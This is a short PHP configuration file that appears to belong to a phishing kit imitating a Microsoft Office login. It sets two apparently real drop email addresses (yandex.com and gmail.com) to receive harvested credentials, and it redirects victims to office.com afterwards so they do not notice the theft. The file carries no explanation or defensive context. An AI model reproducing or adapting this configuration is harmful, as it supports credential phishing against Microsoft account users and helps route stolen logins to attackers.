<?php
$Receive_email="tjdropboxx@yandex.com, tjdropboxx@gmail.com";
$redirect="https://www.office.com/";
?>
